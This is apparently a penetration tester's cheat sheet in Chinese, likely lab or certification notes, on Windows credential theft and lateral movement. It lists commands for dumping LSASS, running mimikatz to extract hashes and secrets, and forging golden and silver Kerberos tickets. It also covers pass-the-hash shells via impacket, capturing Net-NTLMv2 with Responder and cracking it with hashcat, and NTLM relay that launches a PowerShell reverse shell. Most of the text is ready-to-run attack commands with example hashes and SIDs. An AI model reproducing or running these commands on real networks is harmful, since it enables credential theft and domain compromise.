## mimikatz

```bash
	### 直接转储Lsass
		条件：需要SEDebugPrivilege权限，本地管理员默认有此权限
		任务管理器-Lsass-右键-dump fie 
		kali: pypykatz lsa minidump xxx.DMP
			  或crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa  会存到~/.cme/logs/
			  或crackmapexec smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
			  或 新机器上可启用WDigest，但一般情况不需要
		或win: procdump.exe -accepteula -ma "lsass.exe" out.dmp
			   或tasklist | findstr lsass && procdump.exe -accepteula -ma 580 out.dmp
		

## exe use 
	privilege::debug	###开启SeDebugPrivilege访问权限
	token::elevate 		###提升至system权限
	lsadump::sam		###提取SAM中的NTLM哈希
	lsadump::cache         ###和cme的--lsa一样,cme的可以破解
	lsadump::secrets
	lsadump::lsa /patch ###导出krbtgt的NTLM和域SID 和管理和域用户的has
	sekurlsa::logonpasswords  ###尝试从所有可用的来源中提取明文密码和密码哈 > 大量输出
	sekurlsa::tickets   ###TGT TGS 显示存储在内存中的票据
	
	###私钥导出
	crypto::capi        ###CryptoAPI函数
	crypto::cng         ###KeyIso服务
	
	###silver ticket制作 生成白银票据
	kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
	
	###将NTLM hash转成Kerberos ticket
	sekurlsa::pth
	 
	###导出票据 
	sekurlsa::tickets /export
	
	###导出krbtgt的NTLM和域SID
	lsadump::lsa /patch
	
	###删除所有现存的ticket
	kerberos::purge
	
	### 生成黄金票据 用户名要存在
	kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

详解
```bash
## sam
能hash传递，只能解密

## lsa
不能hash传递，只能解密

- `lsadump::sam`: Fetch the local account credentials.
- `lsadump::cache`: Retrieve the cached domain logons.
- `lsadump::secrets`: Get the LSA secrets.


```


## hashcat     hash密码提取

../ kaliEnv/tools_kali





## hash提密码

### NTLM-pth 需要当前账户有管理员权限

对于SMB枚举和管理，我们可以使用smbclient或CrackMapExec。对于命令执行，我们可以使用impacket库中的脚本，如psexec.py和wmiexec.py。如果用户具有所需权限，我们还可以使用NTLM哈希不仅通过SMB连接到目标系统，还可以通过其他协议（如RDP和WinRM）进行连接。我们还可以使用Mimikatz来进行“传递哈希”。

##### smbclient smb连接和管理

```bash
# 列出目标主机所有共享目录
smbclient -p 445 -L \\\\192.168.1.22\\ -U administrator

# 访问目标主机指定的共享目录
smbclient \\\\192.168.1.22\\test -U administrator

# 带密码的访问目标主机指定共享目录
smbclient \\\\192.168.229.61\\test -U offsec --password=lab 

pth
> smbclient \\\\20.63.142.48\\secrets -U Administrator --pw-nt-hash 891315195d73d087f22c018790e9e708
> get secrets.txt

### 先列出所有共享
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
### 再访问指定共享 ls get 
smbclient -p 4455  //192.168.215.63/Scripts -U hr_admin --password Welcome1234  
```

##### getShell 当前账户有管理员权限时可以拿shell

```
> impacket-psexec -hashes 00000000000000000000000000000000:管理员hash Administrator@20.63.142.48 cmd.exe
或
> impacket-wmiexec -hashes 00000000000000000000000000000000:管理员hash  Administrator@192.168.50.212
```



### Net-NTLMv2  无管理员权限

##### smb Connect 可以破解出密码时

```bash
###查看网卡
kali> ip a 	
###选中网卡
kali> responder -I  eth0
###win上smb连接/ 
win> dir \\10.10.10.9\qwe dir
###破解hash
kali> hashcat -h | grep -i 'ntlm'
kali> hashcat -m 5600 klear.hash /usr/share/wordlists/rockyou.txt --force 

```

##### Relaying Net-NTLMv2  上面一步不可以破解出密码时。前提：开启UAC，不开启的话需要当前用户有管理员权限

```bash
###上一步中提hash后破解密码。  现在直接使用这个hash尝试登陆其他机器
###与其仅仅打印在认证步骤中使用的Net-NTLMv2哈希值，我们将其转发到FILES02

kali > nc -lvnp 1234 
kali >impacket-ntlmrelayx --no-http-server -smb2support -t 其他机器的ip -c "powershell -enc Jasdasd"	##win reverse shell > ./powershell.md
有权限的win	>dir \\10.10.10.9\qwe

```











